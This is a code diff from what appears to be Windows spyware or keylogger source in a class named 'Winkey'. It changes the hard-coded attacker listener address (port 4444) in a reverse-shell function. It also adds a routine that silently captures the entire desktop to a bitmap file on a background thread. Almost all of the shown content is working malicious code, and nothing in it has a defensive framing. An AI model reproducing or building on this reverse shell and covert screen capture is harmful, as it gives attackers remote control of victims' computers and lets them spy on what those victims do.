@@ -201,7 +201,7 @@ DWORD WINAPI _reverseShell(LPVOID lpParam)
 {
     (void)lpParam;
     // listener ip, port on attacker's machine
-    char* ip = "10.14.10.10";
+    char* ip = "10.13.10.10";
     short port = 4444;
 
     WSADATA wsaData;
@@ -267,4 +267,89 @@ void	Winkey::startReverseShell(void)
         std::cerr << "CreateThread failed!" << std::endl;
     }
 	return;
+}
+
+BOOL WINAPI _saveBitmap(LPVOID lpParam)
+{
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE* bBits = NULL;
+    //HANDLE /*hHeap*/ = GetProcessHeap();
+    DWORD cbBits, dwWritten = 0;
+    HANDLE hFile;
+    WCHAR* wPath;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+
+    (void)lpParam;
+
+    wPath = SCREEN_PATH;
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24;
+    biHeader.biCompression = BI_RGB;
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+
+
+    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (INVALID_HANDLE_VALUE == hFile)
+    {
+        DeleteDC(hMemDC);
+        ReleaseDC(NULL, hDC);
+        DeleteObject(hBitmap);
+
+        return FALSE;
+    }
+    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
+    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
+    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
+    FlushFileBuffers(hFile);
+    CloseHandle(hFile);
+
+    DeleteDC(hMemDC);
+    ReleaseDC(NULL, hDC);
+    DeleteObject(hBitmap);
+
+    return TRUE;
+}
+
+void Winkey::startCaptureScreen(void)
+{
+    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_saveBitmap), NULL, 0, NULL) == NULL) {
+        std::cerr << "CreateThread failed!" << std::endl;
+    }
+    return;
 }
